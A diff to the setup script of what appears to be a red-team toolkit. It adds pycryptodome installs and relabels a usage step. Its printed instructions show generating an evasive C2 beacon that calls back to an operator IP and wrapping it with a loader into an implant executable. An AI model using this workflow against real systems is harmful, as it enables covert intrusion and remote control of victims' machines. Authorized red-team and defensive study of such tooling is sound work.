@@ -69,6 +69,8 @@ if command -v apt-get &>/dev/null; then
         sed \
         2>/dev/null || true
     ok "APT packages installed"
+    # Ensure pycryptodome is available (apt package name varies)
+    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
 elif command -v dnf &>/dev/null; then
     dnf install -y \
         gcc gcc-c++ make \
@@ -78,6 +80,7 @@ elif command -v dnf &>/dev/null; then
         git curl wget jq unzip sed \
         2>/dev/null || true
     ok "DNF packages installed"
+    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
 elif command -v pacman &>/dev/null; then
     pacman -Sy --noconfirm \
         base-devel mingw-w64-gcc \
@@ -85,6 +88,7 @@ elif command -v pacman &>/dev/null; then
         git curl wget jq unzip \
         2>/dev/null || true
     ok "Pacman packages installed"
+    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
 else
     warn "Unknown package manager — install manually:"
     warn "  build-essential mingw-w64 osslsigncode python3-pycryptodome git curl jq"
@@ -451,7 +455,7 @@ echo -e "     generate beacon --mtls YOUR_IP:8888 --os windows --arch amd64 \\"
 echo -e "       --format shellcode --evasion --c2profile microsoft365 \\"
 echo -e "       --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin"
 echo ""
-echo -e "  ${YELLOW}5. Wrap with Harriet:${NC}"
+echo -e "  ${YELLOW}5. Wrap with Harriet (uses native EXE.sh/DLL.sh):${NC}"
 echo -e "     harriet --shellcode /tmp/beacon.bin --method directsyscall \\"
 echo -e "       --format exe --output /tmp/implant.exe \\"
 echo -e "       --harriet-path $HARRIET_DIR"
